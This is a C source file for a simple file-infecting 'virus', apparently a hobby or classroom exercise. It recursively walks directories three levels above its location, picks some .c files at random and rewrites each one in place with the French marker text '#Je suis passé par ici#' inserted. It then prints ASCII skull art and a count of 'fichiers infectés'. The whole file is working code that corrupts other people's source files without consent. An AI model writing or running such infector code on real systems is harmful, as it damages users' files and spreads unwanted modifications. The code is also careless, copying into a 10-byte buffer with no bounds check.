#include <stdio.h>        
#include <stdlib.h>
#include <time.h>
#include "dirent.h"

#define VIRUS_TEXT "#Je suis passé par ici#"
#define VIRUS_START 12

void ls(char *, int * , int *);
void getExtension(char *, char *);
int infect(char *);
void print(int, int);

int main() {
    srand(time( NULL ));

    char dirname[] = "..\\..\\..";
    int count = 0, infected = 0;
    
    ls(dirname, &count, &infected);

    print(infected, count); 

    return 0;
}

void ls(char * dirname, int * count, int * infected) {
    int i;
    DIR *dir = opendir(dirname);
    struct dirent * ent;
    char path[256], extension[10];

	if (!dir) {
		return;
	}
	
	while ((ent = readdir(dir)) != NULL) {
        if (strcmp(ent->d_name, ".") != 0 && strcmp(ent->d_name, "..") != 0 && strcmp(ent->d_name, ".git") != 0) {
            sprintf(path, "%s\\%s", dirname, ent->d_name);
            switch (ent->d_type) {
                case DT_REG:
                    (*count)++;
                    getExtension(path, extension);
                    if (strcmp(extension, ".c") == 0) {
                        *infected += infect(path);
                    }
                    break;
                case DT_DIR:
                    ls(path, count, infected);
                    break;
            }
        }
	}

	closedir(dir);
}

void getExtension(char * path, char * extension) {
    char * last = strrchr(path, '.');
    strcpy(extension, last);
}

int infect(char * oldPath) {
    FILE * oldFile, * newFile;
    int result = 0, i;
    char newPath[256], c;

    if (rand() % 10 == 3) {
        puts(oldPath);
        result = 1;
        sprintf(newPath, "%s.new", oldPath);
        oldFile = fopen(oldPath, "r");
        newFile = fopen(newPath, "w");
        if (oldFile != NULL && newFile != NULL) {
            for (i = 0; (c = fgetc(oldFile)) != EOF; i++) {
                if (i == VIRUS_START) {
                    fputs(VIRUS_TEXT, newFile);
                }
                fputc(c, newFile);
            }
            fclose(newFile);
            fclose(oldFile);
            remove(oldPath);
            rename(newPath, oldPath);
        }
    }
    return result;
}

void print(int infected, int count) {
    system("chcp 65001");
    system("cls");
    puts("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$'               `$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$'                   `$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n$$$'`$$$$$$$$$$$$$'`$$$$$$!                       !$$$$$$'`$$$$$$$$$$$$$'`$$$\n$$$$  $$$$$$$$$$$  $$$$$$$                         $$$$$$$  $$$$$$$$$$$  $$$$\n$$$$. `$' \\' \\$`  $$$$$$$!                         !$$$$$$$  '$/ `/ `$' .$$$$\n$$$$$. !\\  i  i .$$$$$$$$                           $$$$$$$$. i  i  /! .$$$$$\n$$$$$$   `--`--.$$$$$$$$$                           $$$$$$$$$.--'--'   $$$$$$\n$$$$$$L        `$$$$$^^$$                           $$^^$$$$$'        J$$$$$$\n$$$$$$$.   .'   \"\"~   $$$    $.                 .$  $$$   ~\"\"   `.   .$$$$$$$\n$$$$$$$$.  ;      .e$$$$$!    $$.             .$$  !$$$$$e,      ;  .$$$$$$$$\n$$$$$$$$$   `.$$$$$$$$$$$$     $$$.         .$$$   $$$$$$$$$$$$.'   $$$$$$$$$\n$$$$$$$$    .$$$$$$$$$$$$$!     $$`$$$$$$$$'$$    !$$$$$$$$$$$$$.    $$$$$$$$\n$$$$$$$     $$$$$$$$$$$$$$$$.    $    $$    $   .$$$$$$$$$$$$$$$$     $$$$$$$\n                                 $    $$    $\n                                 $.   $$   .$\n                                 `$        $'\n                                  `$$$$$$$$'\n");
    printf("                         %d / %d fichiers infectés\n\n", infected, count);
    system("pause");
}